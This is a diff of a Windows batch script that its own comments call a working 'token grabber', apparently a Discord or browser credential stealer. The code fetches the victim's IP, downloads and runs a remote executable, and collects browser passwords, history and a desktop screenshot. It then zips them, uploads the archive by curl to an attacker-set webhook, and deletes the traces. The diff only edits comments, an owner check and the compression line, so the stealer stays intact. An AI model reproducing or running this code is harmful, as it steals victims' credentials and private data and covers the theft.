@@ -1,8 +1,6 @@
-@echo off
-:: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
+::Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set webhook=YOUR_WEBHOOK_HERE
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
-set owner="KDot227"
 ::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
@@ -57,7 +55,6 @@ curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 start /w /b main.exe %webhook%
 taskkill /f /im main.exe
-if %owner% == "KDot227" (echo not skid) else (exit)
 
 
 mkdir %localappdata%\Temp\KDOT
@@ -76,7 +73,8 @@ move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-hi
 move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
 move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png
 
-powershell -Command "Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
+powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
 del %localappdata%\Temp\main.exe
 rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
+
